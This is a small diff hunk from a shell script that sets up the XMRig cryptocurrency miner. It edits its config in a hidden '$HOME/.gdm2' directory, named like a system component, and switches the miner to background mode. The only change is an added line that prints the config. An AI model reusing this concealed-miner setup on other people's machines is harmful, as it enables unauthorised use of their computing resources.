@@ -351,6 +351,7 @@ sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2/con
 
 cp $HOME/.gdm2/config.json $HOME/.gdm2/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2/config_background.json
+cat $HOME/.gdm2/config.json
 
 rm -rf xmrig.tar*
 
